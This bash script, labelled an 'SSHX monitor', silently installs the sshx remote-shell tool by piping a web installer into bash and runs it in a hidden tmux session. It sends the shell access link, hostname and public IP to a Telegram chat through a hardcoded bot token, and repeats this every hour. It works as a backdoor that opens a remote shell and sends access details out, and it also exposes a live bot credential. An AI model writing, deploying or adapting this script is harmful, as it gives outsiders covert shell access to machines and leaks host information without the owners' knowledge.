#!/bin/bash

BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"

send() {
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
         -d "chat_id=$CHAT_ID" \
         -d "text=$1" \
         -d "parse_mode=HTML" > /dev/null
}

# Detect OS & install dependencies
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
fi

case $OS in
ubuntu|debian)
    UPDATE="apt-get update -y"
    INSTALL="apt-get install -y"
    ;;
centos|rhel|almalinux)
    UPDATE="yum makecache -y"
    INSTALL="yum install -y"
    ;;
fedora)
    UPDATE="dnf makecache -y"
    INSTALL="dnf install -y"
    ;;
*)
    UPDATE="apt-get update -y"
    INSTALL="apt-get install -y"
    ;;
esac

$UPDATE >/dev/null 2>&1
command -v curl >/dev/null || $INSTALL curl >/dev/null 2>&1
command -v tmux >/dev/null || $INSTALL tmux >/dev/null 2>&1

# Install SSHX jika belum ada
if ! command -v sshx >/dev/null; then
    curl -fsSL https://sshx.io/get | bash >/dev/null 2>&1
fi

export PATH=$PATH:$HOME/.sshx/bin

# Hapus session lama
tmux kill-session -t sshxmon 2>/dev/null

# Jalankan SSHX di tmux dan capture output ke variabel
tmux new-session -d -s sshxmon bash -c 'sshx'

# Tunggu sebentar sampai SSHX siap
sleep 5

# Ambil link dari tmux
LINK=$(tmux capture-pane -pt sshxmon | grep -o "https://sshx.io/s/[^ ]*" | head -n1)
HOST=$(hostname)
IP=$(curl -s ifconfig.me)
TIME=$(date)

# Kirim Telegram awal
send "✅ <b>SSHX MONITOR STARTED</b>
Host: $HOST
IP: $IP
Time: $TIME

sshx v0.4.1
➜ Link: $LINK
➜ Shell: /bin/bash"

# Update Telegram setiap 1 jam
while true
do
    sleep 3600
    LINK=$(tmux capture-pane -pt sshxmon | grep -o "https://sshx.io/s/[^ ]*" | head -n1)
    TIME=$(date)
    send "✅ <b>SSHX MONITOR UPDATE</b>
Host: $HOST
IP: $IP
Time: $TIME

sshx v0.4.1
➜ Link: $LINK
➜ Shell: /bin/bash"
done
